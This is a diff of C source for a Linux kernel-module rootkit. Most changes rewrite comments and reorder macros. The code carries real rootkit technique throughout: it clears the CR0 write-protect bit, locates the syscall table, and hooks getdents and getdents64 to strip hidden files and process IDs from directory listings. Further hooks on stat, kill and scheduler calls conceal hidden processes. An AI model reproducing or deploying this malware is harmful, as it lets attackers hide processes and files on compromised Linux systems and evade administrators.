@@ -1,16 +1,13 @@
-#include <linux/version.h> // LINUX_VERSION_CODE
-#include <linux/syscalls.h> //__MAP, __SC_DECL, __NR_syscall
-#include <linux/types.h> //bool
+#include <linux/version.h>  // LINUX_VERSION_CODE
+#include <linux/syscalls.h> // __MAP, __SC_DECL, __NR_syscall
 #include <linux/slab.h>		// kmalloc()
 
 #include "config.h"
 #include "hooks.h"
 #include "hiding.h"
 
-// Custom write_cr0 and custom write_cr4, as the ones the kernel provides 
-// check if we are overwriting important bits
+// Custom write_cr0 as the one the kernel provides checks if we are overwriting WP bit
 #define WP_BIT_IN_CR0 16
-#define SMAP_BIT_IN_CR4 21
 
 #define write_cr0(val) asm volatile("mov %0, %%cr0":"+r" (val), "+m" (__force_order));
 
@@ -23,12 +20,14 @@ static void DISABLE_WRITE(void){
 	write_cr0(val)
 }
 
-
+// Necessary stuff for getdents and getdents64 hooks
 struct linux_dirent {
 	unsigned long   d_ino;
 	unsigned long   d_off;
-	unsigned short  d_reclen; // d_reclen is the way to tell the length of this entry
-	char            d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
+	// d_reclen is the way to tell the length of this entry
+	unsigned short  d_reclen;
+	// Its length is actually longer, and the struct size is variable
+	char            d_name[1];
 };
 
 typedef unsigned long long ino64_t;
@@ -36,23 +35,43 @@ typedef unsigned long long off64_t;
 struct linux_dirent64 {
 	ino64_t         d_ino;
 	off64_t         d_off;
-	unsigned short  d_reclen; // d_reclen is the way to tell the length of this entry
-	char            padding; // I don't know why but without this d_name includes one extra byte
-	                         // at the beggining that doesn't belong to the name
-	char            d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
+	unsigned short  d_reclen; 
+	// I don't know why but without this d_name includes one extra byte
+	// at the beggining that doesn't belong to the name
+	char            padding; 
+	char            d_name[1]; 
 };
 
 static unsigned long *syscall_table = NULL;
 
-// HOOK DEFINING MACROS ---------------------------------------------
+/* HOOK DEFINING MACROS ------------------------------------------------------
+ * Each hook is made up of three functions: sys_orig, sys_hook and
+ * sys_do_hook. When the hook is performed, the original address of the 
+ * syscall is saved as sys_orig, and it is replaced by sys_hook, which calls
+ * sys_do_hook. This last function is where the job is done, and may call
+ * sys_orig or not.
+ * 
+ * There seem to be two different calling convention in linux kernel depending
+ * on the version. *Above 4.17, normal args are replaced by a struct pt_regs*.
+ * Because of that, there are macros for handling both calling conventions
+ * so we can define hooks easily from `hook_define`:
+ *  - DECL_DO_HOOK: Arguments of the declaration of sys_do_hook
+ *  - DECL_ORIG_HOOK: Arguments of the declaration of sys_orig and sys_hook
+ *  - ARGS_DO_HOOK: Arguments for calling sys_do_hook (usually from sys_hook)
+ *  - ARGS_ORIG: Arguments for calling sys_orig (usually from sys_do_hook)
+ * 
+ * Note sys_do_hook always receives normal arguments and also regs, which
+ * is non-NULL only if kernel version is above 4.17, when it needs it for
+ * calling sys_orig.
+*/
 #define sys_orig(name) sys_##name##_orig
 #define sys_hook(name) sys_##name##_hook
 #define sys_do_hook(name) sys_##name##_do_hook
 #define sys_num(name) __NR_##name
 #define sys_define(name_mayus) HOOK_##name_mayus
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0) //pt_regs struct for args, kernel >= 4.17
-//similar to how kernel defines __MAP in syscalls.h
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
+// Accessing pt_regs, similar to how kernel defines __MAP in syscalls.h
 #define args1 regs->di
 #define args2 args1, regs->si
 #define args3 args2, regs->dx
@@ -60,35 +79,38 @@ static unsigned long *syscall_table = NULL;
 #define args5 args4, regs->r8
 #define args6 args5, regs->r9
 #define args(n) args##n
+
 #define DECL_DO_HOOK(n_args, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__), const struct pt_regs* regs
 #define DECL_ORIG_HOOK(n_args, ...) const struct pt_regs* regs
-#define ARGS_ORIG(n_args, ...) regs
 #define ARGS_DO_HOOK(n_args, ...) args(n_args), regs
+#define ARGS_ORIG(n_args, ...) regs
 
-#else //normal args, kernel < 4.17
+#else
 #define DECL_DO_HOOK(n_args, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__), const struct pt_regs* regs
 #define DECL_ORIG_HOOK(n_args, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__)
-#define ARGS_ORIG(n_args, ...) __MAP(n_args, __SC_ARGS, __VA_ARGS__)
 #define ARGS_DO_HOOK(n_args, ...) ARGS_ORIG(n_args, __VA_ARGS__), NULL //regs is null, as these kernel versions do not use it
+#define ARGS_ORIG(n_args, ...) __MAP(n_args, __SC_ARGS, __VA_ARGS__)
 #endif
 
-//similar to how kernel defines syscalls using SYSCALL_DEFINEx
+// Similar to how kernel defines syscalls using SYSCALL_DEFINEx
 #define hook_define(n_args, ret_type, name, ...)                                            \
-	static asmlinkage ret_type sys_do_hook(name)(DECL_DO_HOOK(n_args, __VA_ARGS__));               \
-	static asmlinkage ret_type (*sys_orig(name))(DECL_ORIG_HOOK(n_args, __VA_ARGS__));             \
-	static asmlinkage ret_type sys_hook(name)(DECL_ORIG_HOOK(n_args, __VA_ARGS__)){                \
+	static asmlinkage ret_type sys_do_hook(name)(DECL_DO_HOOK(n_args, __VA_ARGS__));        \
+	static asmlinkage ret_type (*sys_orig(name))(DECL_ORIG_HOOK(n_args, __VA_ARGS__));      \
+	static asmlinkage ret_type sys_hook(name)(DECL_ORIG_HOOK(n_args, __VA_ARGS__)){         \
 		ret_type ret = sys_do_hook(name)(ARGS_DO_HOOK(n_args, __VA_ARGS__));                \
 		return ret;                                                                         \
 	}
 
-
+// Save original syscall and write the hook
 #define perform_hook(name, name_mayus) \
 	sys_orig(name) = (void*)syscall_table[sys_num(name)]; \
 	if (sys_define(name_mayus)) syscall_table[sys_num(name)] = sys_hook(name);
 
+// Restore original syscall
 #define disable_hook(name, name_mayus) \
 	if (sys_define(name_mayus)) syscall_table[sys_num(name)] = sys_orig(name);
-// END HOOK DEFINING MACROS -----------------------------------------
+
+// END HOOK DEFINING MACROS --------------------------------------------------
 
 hook_define(3, long, getdents, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count)
 hook_define(3, long, getdents64, unsigned int, fd, struct linux_dirent64 __user*, dirent, unsigned int, count)
@@ -106,6 +128,7 @@ hook_define(1, long, sched_getscheduler, pid_t, pid)
 hook_define(2, long, sched_rr_get_interval, pid_t, pid, void __user *, interval)
 hook_define(2, long, kill, pid_t, pid, int, sig)
 
+// Macro for defining getdents and getdents64 do_hook. They're almost the same
 #define sys_getdents_do_hook_define(v)                                                               \
 static asmlinkage long sys_getdents##v##_do_hook(unsigned int fd, struct linux_dirent##v __user* dirent, unsigned int count, const struct pt_regs* regs) { \
 	int buff_offset, deleted_size;                                                                   \
@@ -117,12 +140,15 @@ static asmlinkage long sys_getdents##v##_do_hook(unsigned int fd, struct linux_d
 \
 	ret = sys_getdents##v##_orig(ARGS_ORIG(3, unsigned int, fd, struct linux_dirent##v __user*, dirent, unsigned int, count)); \
 \
+	/* Copy dirent buff to kernel memory */                                                          \
 	my_dirent = kmalloc(ret, GFP_KERNEL);                                                            \
 	if (my_dirent == NULL){                                                                          \
 		log("ROOTKIT: ERROR kmalloc(%d) in getdents hook", ret);                                     \
 		return -1;                                                                                   \
 	}                                                                                                \
 	copy_from_user(my_dirent, dirent, ret);                                                          \
+\
+	/* Delete the entry if it contains HIDE_STR, if it is a hidden file or if it is a hidden pid */  \
 	buff_offset = 0;                                                                                 \
 	while (buff_offset < ret){                                                                       \
 		currnt = (struct linux_dirent##v*)((char*)my_dirent + buff_offset);                          \
@@ -154,15 +180,17 @@ static asmlinkage long sys_getdents##v##_do_hook(unsigned int fd, struct linux_d
 sys_getdents_do_hook_define()
 sys_getdents_do_hook_define(64)
 
+// Wrapper for pid_in_pathname which adds logging
 static int check_pid_in_pathname(const char __user *pathname, const char* syscall_caller){
 	int pid;
-	if ((pid = pathname_includes_pid(pathname)) != -1){
+	if ((pid = pid_in_pathname(pathname)) != -1){
 		log(KERN_INFO "ROOTKIT: Hidden process %d from call to %s\n", pid, syscall_caller);
 		return -1;
 	}
 	return 0;
 }
 
+// Wrapper for is_pid_hidden which adds logging
 static int check_pid(int pid, const char* syscall_caller){
 	if (is_pid_hidden(pid)){
 		log(KERN_INFO "ROOTKIT: Hidden process %d from call to %s\n", pid, syscall_caller);
@@ -171,6 +199,7 @@ static int check_pid(int pid, const char* syscall_caller){
 	return 0;
 }
 
+// Hooks for those syscalls that will try to discover hidden PIDs
 static asmlinkage long sys_stat_do_hook(const char __user *pathname, struct __old_kernel_stat __user *statbuf, const struct pt_regs* regs){
 	if (check_pid_in_pathname(pathname, "stat") == -1) return -ENOENT;
 	return sys_stat_orig(ARGS_ORIG(2, const char __user *, pathname, struct __old_kernel_stat __user*, statbuf));
@@ -237,7 +266,7 @@ static asmlinkage long sys_kill_do_hook(pid_t pid, int sig, const struct pt_regs
 }
 
 
-//__init para que solo lo haga una vez y después pueda sacarlo de memoria
+//__init so it is removed from memory after being called once
 int __init hooks_init(void){
 	if ((syscall_table = (void *)kallsyms_lookup_name("sys_call_table")) == NULL){
 		log(KERN_ERR "ROOTKIT ERROR: Syscall table not found!");
